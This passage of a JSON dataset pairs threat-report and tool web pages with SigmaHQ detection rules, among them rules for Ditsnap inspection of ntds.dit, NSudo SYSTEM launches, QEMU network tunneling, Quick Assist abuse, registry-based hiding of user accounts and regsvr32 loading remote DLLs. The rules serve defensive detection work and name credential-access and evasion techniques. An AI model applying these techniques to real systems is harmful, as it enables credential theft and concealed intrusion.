      "id": "d3b70aad-097e-409c-9df2-450f80dc476b",
      "status": "test",
      "description": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit.",
      "references": [
        "https://thedfirreport.com/2020/06/21/snatch-ransomware/",
        "https://web.archive.org/web/20201124182207/https://github.com/yosqueoy/ditsnap"
      ],
      "author": "Furkan Caliskan (@caliskanfurkan_)",
      "date": "2020-07-04",
      "modified": "2023-02-21",
      "tags": [
        "attack.credential-access",
        "attack.t1003.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\ditsnap.exe"
          },
          {
            "CommandLine|contains": "ditsnap.exe"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate admin usage"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_ditsnap.yml"
  },
  "390": {
    "url": "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/",
    "markdown": "# NSudo | System Administration Toolkit ## About ### Prototype NSudo Launcher is based on SuperCMD by Raymai97. Visit here for more information about SuperCMD. NSudo Devil Mode is based on the Dism++ God Mode, with new features and several improvements. ### Features - Distributed under the MIT License. - Provide the x86, x86-64, ARM64 binaries. - Support Windows Vista and later. - Using VC-LTL and libkcrt from Chuyu Team for smaller binary size. - Using C++17, but only use core language features in the most cases. - NSudo Launcher - Launch programs with TrustedInstaller access token. - Launch programs",
    "sigma_rule": {
      "title": "PUA - NSudo Execution",
      "id": "771d1eb5-9587-4568-95fb-9ec44153a012",
      "status": "test",
      "description": "Detects the use of NSudo tool for command execution",
      "references": [
        "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali",
      "date": "2022-01-24",
      "modified": "2023-02-13",
      "tags": [
        "attack.execution",
        "attack.t1569.002",
        "attack.s0029"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\NSudo.exe",
              "\\NSudoLC.exe",
              "\\NSudoLG.exe"
            ]
          },
          {
            "OriginalFileName": [
              "NSudo.exe",
              "NSudoLC.exe",
              "NSudoLG.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "-U:S ",
            "-U:T ",
            "-U:E ",
            "-P:E ",
            "-M:S ",
            "-M:H ",
            "-U=S ",
            "-U=T ",
            "-U=E ",
            "-P=E ",
            "-M=S ",
            "-M=H ",
            "-ShowWindowMode:Hide"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_nsudo.yml"
  },
  "391": {
    "url": "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/",
    "markdown": "# How to Run a Program as SYSTEM (LocalSystem) Account in Windows _Last Updated on: May 18, 2021_ Many Windows system files, registry keys, and services are owned by the `SYSTEM` (a.k.a LocalSystem) account, which has a high privilege level. If you need to modify a registry key owned by the `SYSTEM` account, there are at least two options. The first option that comes to your mind is to take ownership of the corresponding registry key, assign yourself Full Control permissions. Once the registry key or the values are updated, revert the permissions and ownership to `SYSTEM`. There is, however,",
    "sigma_rule": {
      "title": "PUA - NSudo Execution",
      "id": "771d1eb5-9587-4568-95fb-9ec44153a012",
      "status": "test",
      "description": "Detects the use of NSudo tool for command execution",
      "references": [
        "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/",
        "https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali",
      "date": "2022-01-24",
      "modified": "2023-02-13",
      "tags": [
        "attack.execution",
        "attack.t1569.002",
        "attack.s0029"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\NSudo.exe",
              "\\NSudoLC.exe",
              "\\NSudoLG.exe"
            ]
          },
          {
            "OriginalFileName": [
              "NSudo.exe",
              "NSudoLC.exe",
              "NSudoLG.exe"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains": [
            "-U:S ",
            "-U:T ",
            "-U:E ",
            "-P:E ",
            "-M:S ",
            "-M:H ",
            "-U=S ",
            "-U=T ",
            "-U=E ",
            "-P=E ",
            "-M=S ",
            "-M=H ",
            "-ShowWindowMode:Hide"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate use by administrators"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_pua_nsudo.yml"
  },
  "392": {
    "url": "https://securelist.com/network-tunneling-with-qemu/111803/",
    "markdown": "# Network tunneling with… QEMU? **Research** 05 Mar 2024 --- Cyberattackers tend to give preference to legitimate tools when taking various attack steps, as these help them evade detection systems while keeping malware development costs down to a minimum. Network scanning, capturing a process memory dump, exfiltrating data, running files remotely, and even encrypting drives — all these can be done with trusted software. To gain a foothold inside a compromised infrastructure and develop the attack, adversaries can use previously installed malware or connect to the network along with employees through the company’s RDP servers or corporate VPN (to do",
    "sigma_rule": {
      "title": "Potentially Suspicious Usage Of Qemu",
      "id": "5fc297ae-25b6-488a-8f25-cc12ac29b744",
      "status": "test",
      "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
      "references": [
        "https://securelist.com/network-tunneling-with-qemu/111803/",
        "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5"
      ],
      "author": "Muhammad Faisal (@faisalusuf), Hunter Juhan (@threatHNTR)",
      "date": "2024-06-03",
      "tags": [
        "attack.command-and-control",
        "attack.t1090",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "-m 1M",
            "-m 2M",
            "-m 3M"
          ],
          "CommandLine|contains|all": [
            "restrict=off",
            "-netdev ",
            "connect=",
            "-nographic"
          ]
        },
        "filter_main_normal_usecase": {
          "CommandLine|contains": [
            " -cdrom ",
            " type=virt ",
            " -blockdev "
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_qemu_suspicious_execution.yml"
  },
  "393": {
    "url": "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5",
    "markdown": "",
    "sigma_rule": {
      "title": "Potentially Suspicious Usage Of Qemu",
      "id": "5fc297ae-25b6-488a-8f25-cc12ac29b744",
      "status": "test",
      "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
      "references": [
        "https://securelist.com/network-tunneling-with-qemu/111803/",
        "https://www.qemu.org/docs/master/system/invocation.html#hxtool-5"
      ],
      "author": "Muhammad Faisal (@faisalusuf), Hunter Juhan (@threatHNTR)",
      "date": "2024-06-03",
      "tags": [
        "attack.command-and-control",
        "attack.t1090",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "-m 1M",
            "-m 2M",
            "-m 3M"
          ],
          "CommandLine|contains|all": [
            "restrict=off",
            "-netdev ",
            "connect=",
            "-nographic"
          ]
        },
        "filter_main_normal_usecase": {
          "CommandLine|contains": [
            " -cdrom ",
            " type=virt ",
            " -blockdev "
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_qemu_suspicious_execution.yml"
  },
  "394": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/",
    "markdown": "### Threat actors misusing Quick Assist in social engineering attacks leading to ransomware **May 15, 2024** **Categories:** - Research - Threat intelligence - Microsoft Defender - Social engineering / phishing **Tags:** - Microsoft Defender for Endpoint - Microsoft Defender Threat Intelligence - Attacker techniques, tools, and infrastructure - Cybercrime - Ransomware - Threat actors --- > **June 2024 update**: At the end of May 2024, Microsoft Threat Intelligence observed Storm-1811 using Microsoft Teams as another vector to contact target users. Microsoft assesses that the threat actor uses Teams to send messages and initiate calls in an attempt to impersonate IT",
    "sigma_rule": {
      "title": "QuickAssist Execution",
      "id": "e20b5b14-ce93-4230-88af-981983ef6e74",
      "status": "experimental",
      "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/",
        "https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/",
        "https://x.com/cyb3rops/status/1862406110365245506",
        "https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist"
      ],
      "author": "Muhammad Faisal (@faisalusuf)",
      "date": "2024-12-19",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\QuickAssist.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Quick Assist in the environment."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_quickassist_execution.yml"
  },
  "395": {
    "url": "https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/",
    "markdown": "# Post I've been assisting a few orgs hit with successful ransomware deployment lately where two newish things are at play - sharing is caring. They're doing initial recon over the phone for contact details, then flooding the users with email and/or Teams spam (think thousands of messages an hour). Then they phone up and pretend to be from IT to stop the spam - they use Microsoft Quick Assist to take remote control of the system, and install an SSH reverse shell backdoor, and stop the spam run. From there they hand off to another team, who move laterally",
    "sigma_rule": {
      "title": "QuickAssist Execution",
      "id": "e20b5b14-ce93-4230-88af-981983ef6e74",
      "status": "experimental",
      "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/",
        "https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/",
        "https://x.com/cyb3rops/status/1862406110365245506",
        "https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist"
      ],
      "author": "Muhammad Faisal (@faisalusuf)",
      "date": "2024-12-19",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\QuickAssist.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Quick Assist in the environment."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_quickassist_execution.yml"
  },
  "396": {
    "url": "https://x.com/cyb3rops/status/1862406110365245506",
    "markdown": "# Post Nov 29, 2024 Interesting finding : Quick Assist https://linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ ```image Description: The image depicts a screenshot of the Windows operating system interface, specifically showing the search results for the 'Quick Assist' application. The left side highlights 'Quick Assist' as the best match under apps, and the right side provides options associated with the application, such as 'Open', 'Run as administrator', 'Pin to Start', and 'Uninstall'. This visual aids in understanding how to access the Quick Assist feature, which is relevant to the context of using it in cyber threats as discussed in the accompanying text. Transcription: | I've",
    "sigma_rule": {
      "title": "QuickAssist Execution",
      "id": "e20b5b14-ce93-4230-88af-981983ef6e74",
      "status": "experimental",
      "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/",
        "https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/",
        "https://x.com/cyb3rops/status/1862406110365245506",
        "https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist"
      ],
      "author": "Muhammad Faisal (@faisalusuf)",
      "date": "2024-12-19",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\QuickAssist.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Quick Assist in the environment."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_quickassist_execution.yml"
  },
  "397": {
    "url": "https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist",
    "markdown": "# Use Quick Assist to help users Quick Assist is an application that enables a person to share their Windows or macOS device with another person over a remote connection. Your support staff can use it to remotely connect to a user's device and then view its display, make annotations, or take full control. In this way, they can troubleshoot, diagnose technological issues, and provide instructions to users directly on their devices. > **Important** > Learn how to protect yourself from tech support scams. Tech support scams are an industry-wide issue where scammers use scare tactics to trick you into",
    "sigma_rule": {
      "title": "QuickAssist Execution",
      "id": "e20b5b14-ce93-4230-88af-981983ef6e74",
      "status": "experimental",
      "description": "Detects the execution of Microsoft Quick Assist tool \"QuickAssist.exe\". This utility can be used by attackers to gain remote access.\n",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/",
        "https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/",
        "https://x.com/cyb3rops/status/1862406110365245506",
        "https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist"
      ],
      "author": "Muhammad Faisal (@faisalusuf)",
      "date": "2024-12-19",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\QuickAssist.exe"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Legitimate use of Quick Assist in the environment."
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_quickassist_execution.yml"
  },
  "398": {
    "url": "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
    "markdown": "# Buzzing on Christmas Eve: Trigona Ransomware in 3 Hours **Categories:** Exfiltrate Data ransomware rdp trigona **Published on:** January 29, 2024 ## Key Takeaways - In late December 2022, we observed threat actors exploiting a publicly exposed Remote Desktop Protocol (RDP) host, leading to data exfiltration and the deployment of Trigona ransomware. - On Christmas Eve, within just three hours of gaining initial access, the threat actors executed ransomware across the entire network. - The threat actors employed a batch script to exfiltrate data, and dropped a series of other batch scripts that could hinder defensive measures, establish a user",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
      "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
      "related": [
        {
          "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
      "references": [
        "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
        "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
        "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-14",
      "modified": "2024-08-23",
      "tags": [
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
            "add",
            "/v",
            "/d 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "System administrator activities"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_registry_special_accounts_hide_user.yml"
  },
  "399": {
    "url": "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
    "markdown": "# From OneNote to RansomNote: An Ice Cold Intrusion **Categories:** adfind Exfiltrate Data icedid nokoyawa ransomware **Published on:** April 1, 2024 ## Key Takeaways - In late February 2023, threat actors rode a wave of initial access using Microsoft OneNote. In this case, we observed a threat actor deliver IcedID using this method. - After loading IcedID and establishing persistence, there were no further actions, other than beaconing for over 30 days. - The threat actor used Cobalt Strike and AnyDesk to target a file server and a backup server. - The threat actor used FileZilla to exfiltrate data from",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
      "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
      "related": [
        {
          "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
      "references": [
        "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
        "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
        "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-14",
      "modified": "2024-08-23",
      "tags": [
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
            "add",
            "/v",
            "/d 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "System administrator activities"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_registry_special_accounts_hide_user.yml"
  },
  "400": {
    "url": "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
    "markdown": "",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
      "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
      "related": [
        {
          "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
      "references": [
        "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
        "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
        "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-14",
      "modified": "2024-08-23",
      "tags": [
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
            "add",
            "/v",
            "/d 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "System administrator activities"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_registry_special_accounts_hide_user.yml"
  },
  "401": {
    "url": "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/",
    "markdown": "# SELECT XMRig FROM SQLServer **Categories:** coinminer, exploit **Published Date:** July 11, 2022 --- In March 2022, we observed an intrusion on a public-facing Microsoft SQL Server. The end goal of this intrusion was to deploy a coin miner. Although deploying a coin miner on a vulnerable server after successful exploitation is a common objective for threat actors, this intrusion was slightly different and therefore more interesting. US CERT recently published a malware analysis report related to XMRig coin miner on 23rd June 2022 (link) and a security tip for defending against this threat (link). --- ## Summary Over the",
    "sigma_rule": {
      "title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
      "id": "9ec9fb1b-e059-4489-9642-f270c207923d",
      "related": [
        {
          "id": "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects changes to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen.\n",
      "references": [
        "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/",
        "https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/",
        "https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/",
        "https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/"
      ],
      "author": "@Kostastsale, TheDFIRReport",
      "date": "2022-05-14",
      "modified": "2024-08-23",
      "tags": [
        "attack.t1564.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\reg.exe",
          "CommandLine|contains|all": [
            "\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
            "add",
            "/v",
            "/d 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "System administrator activities"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_registry_special_accounts_hide_user.yml"
  },
  "402": {
    "url": "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/",
    "markdown": "# Follina Exploit Leads to Domain Compromise **Categories:** adfind cobaltstrike Qbot **Published on:** October 31, 2022 --- In early June 2022, we observed an intrusion where a threat actor gained initial access by exploiting the CVE-2022-30190 (Follina) vulnerability, which triggered a Qbot infection chain. Qbot, also known as Qakbot or Pinksliplot, is actively developed and capable of a number of functions from reconnaissance, lateral movement, data exfiltration, to delivering other payloads acting as an initial access broker. Qbot is regarded by US CERT as being one of the 2021 Top Malware Strains in Alert (AA22-216A). In the past, we’ve covered",
    "sigma_rule": {
      "title": "Suspicious Regsvr32 Execution From Remote Share",
      "id": "88a87a10-384b-4ad7-8871-2f9bf9259ce5",
      "status": "test",
      "description": "Detects REGSVR32.exe to execute DLL hosted on remote shares",
      "references": [
        "https://thedfirreport.com/2022/10/31/follina-exploit-leads-to-domain-compromise/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-10-31",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\regsvr32.exe"
          },
          {
            "OriginalFileName": "\\REGSVR32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": " \\\\\\\\"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_remote_share.yml"
  },
  "403": {
    "url": "https://redcanary.com/blog/intelligence-insights-april-2022/",
    "markdown": "# Intelligence Insights: April 2022 **SocGholish falls from first place, Yellow Cockatoo rebounds in March, and Qbot campaigns leverage Windows Installer packages.** *Originally published April 21, 2022. Last modified April 30, 2024.* --- *Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community.* ## Highlights As we’ve done for the past few months, we again looked at",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of Regsvr32",
      "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-april-2022/",
        "https://www.echotrail.io/insights/search/regsvr32.exe",
        "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo"
      ],
      "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-05-05",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\regsvr32.exe",
          "Image|endswith": [
            "\\calc.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\werfault.exe",
          "CommandLine|contains": " -u -p "
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely, but can rarely occur. Apply additional filters accordingly."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_child_process.yml"
  },
  "404": {
    "url": "https://www.echotrail.io/insights/search/regsvr32.exe",
    "markdown": "# regsvr32.exe **Author**: Microsoft *This executable was created by Microsoft.* **Source**: Wild *This process execution profile was obtained from the wild, i.e. not from a lab environment.* ## Summary Microsoft Register Server ## EchoTrail Prevalence Score (EPS) **86.2** *The EchoTrail Prevalence Score (EPS) is calculated using a formula that takes into account much of the process metadata we collect from computers in the wild. The score is a number between 0 and 100, with a higher number indicating a higher incidence of this process being run in the wild. A low score would indicate an unusual or new process that",
    "sigma_rule": {
      "title": "Potentially Suspicious Child Process Of Regsvr32",
      "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
      "related": [
        {
          "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes of \"regsvr32.exe\".",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-april-2022/",
        "https://www.echotrail.io/insights/search/regsvr32.exe",
        "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo"
      ],
      "author": "elhoim, Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-05-05",
      "modified": "2023-05-26",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.010"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\regsvr32.exe",
          "Image|endswith": [
            "\\calc.exe",
            "\\cscript.exe",
            "\\explorer.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\nltest.exe",
            "\\notepad.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\reg.exe",
            "\\schtasks.exe",
            "\\werfault.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_werfault": {
          "Image|endswith": "\\werfault.exe",
          "CommandLine|contains": " -u -p "
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unlikely, but can rarely occur. Apply additional filters accordingly."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_regsvr32_susp_child_process.yml"
  },
  "405": {
    "url": "https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo",
